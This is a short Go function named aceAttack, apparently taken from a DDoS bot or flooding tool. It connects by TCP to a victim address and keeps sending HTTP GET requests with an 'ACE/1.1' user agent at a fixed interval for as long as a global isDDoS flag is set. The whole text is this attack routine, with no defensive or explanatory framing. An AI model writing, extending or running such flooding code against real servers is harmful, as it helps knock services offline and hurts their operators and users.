```go
func aceAttack(vic string, interval int) {
	conn, err := net.DialTimeout("tcp", vic, 10*time.Second)
	if err!= nil {
		return
	}
	defer conn.Close()

	for isDDoS {
		_, err := conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + vic + "\r\nUser-Agent: ACE/1.1\r\nAccept: */*\r\n\r\n"))
		if err!= nil {
			return
		}
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}
```

